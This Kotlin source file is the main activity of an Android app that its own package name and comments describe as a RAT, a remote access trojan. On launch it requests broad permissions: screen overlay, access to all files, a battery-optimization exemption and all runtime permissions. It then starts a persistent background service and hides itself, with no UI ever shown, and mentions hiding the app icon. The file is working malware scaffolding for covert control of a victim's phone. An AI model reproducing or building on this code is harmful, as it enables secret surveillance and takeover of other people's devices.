package com.rat.client

import android.Manifest
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.PowerManager
import android.provider.Settings
import android.util.Log
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import com.rat.client.services.BackgroundService
import com.rat.client.utils.PermissionManager

/**
 * Main entry point for the RAT application.
 * On launch:
 * 1. Requests all required permissions (with rationale)
 * 2. Requests special permissions (overlay, manage storage, battery optimization)
 * 3. Starts the foreground background service
 * 4. Finishes immediately (no UI ever shown)
 */
class MainActivity : AppCompatActivity() {
    companion object {
        private const val TAG = "MainActivity"
        private const val PERMISSION_REQUEST_CODE = 9999
        private const val OVERLAY_REQUEST_CODE = 10001
        private const val MANAGE_STORAGE_REQUEST_CODE = 10002
        private const val BATTERY_OPTIMIZATION_REQUEST_CODE = 10003
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        Log.d(TAG, "Activity created")

        // Check if we should continue based on config
        // If HIDE_APP_ICON is true, we minimize visual footprint

        // Step 1: Request special permissions first
        requestOverlayPermission()
        requestManageStorage()
        requestBatteryOptimization()

        // Step 2: Request runtime permissions
        requestRuntimePermissions()
    }

    private fun requestRuntimePermissions() {
        PermissionManager.requestAllPermissions(this, PERMISSION_REQUEST_CODE)
        PermissionManager.requestNotificationPermission(this)
    }

    private fun requestOverlayPermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (!Settings.canDrawOverlays(this)) {
                try {
                    val intent = Intent(
                        Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                        Uri.parse("package:$packageName")
                    )
                    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                    startActivityForResult(intent, OVERLAY_REQUEST_CODE)
                } catch (e: Exception) {
                    Log.e(TAG, "Overlay request error: ${e.message}")
                }
            }
        }
    }

    private fun requestManageStorage() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            if (!android.os.Environment.isExternalStorageManager()) {
                try {
                    val intent = Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION)
                    intent.data = Uri.parse("package:$packageName")
                    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                    startActivityForResult(intent, MANAGE_STORAGE_REQUEST_CODE)
                } catch (e: Exception) {
                    // Fallback
                    try {
                        val intent = Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION)
                        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                        startActivityForResult(intent, MANAGE_STORAGE_REQUEST_CODE)
                    } catch (e2: Exception) {
                        Log.e(TAG, "Manage storage error: ${e2.message}")
                    }
                }
            }
        }
    }

    private fun requestBatteryOptimization() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            try {
                val powerManager = getSystemService(POWER_SERVICE) as PowerManager
                if (!powerManager.isIgnoringBatteryOptimizations(packageName)) {
                    val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS)
                    intent.data = Uri.parse("package:$packageName")
                    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                    startActivityForResult(intent, BATTERY_OPTIMIZATION_REQUEST_CODE)
                }
            } catch (e: Exception) {
                Log.e(TAG, "Battery optimization error: ${e.message}")
            }
        }
    }

    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<out String>,
        grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        Log.d(TAG, "Permissions result: $requestCode")

        // Start service regardless (some permissions may be granted)
        startBackgroundService()
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        Log.d(TAG, "Activity result: $requestCode")

        // Start service after special permission requests return
        startBackgroundService()
    }

    private fun startBackgroundService() {
        BackgroundService.startService(this)
        Log.d(TAG, "Background service started, finishing activity")

        // Move task to background and finish
        try {
            moveTaskToBack(true)
        } catch (e: Exception) {
            Log.e(TAG, "moveTaskToBack error: ${e.message}")
        }

        // Finish activity immediately
        finish()
    }

    override fun onDestroy() {
        super.onDestroy()
        Log.d(TAG, "Activity destroyed")
    }
}

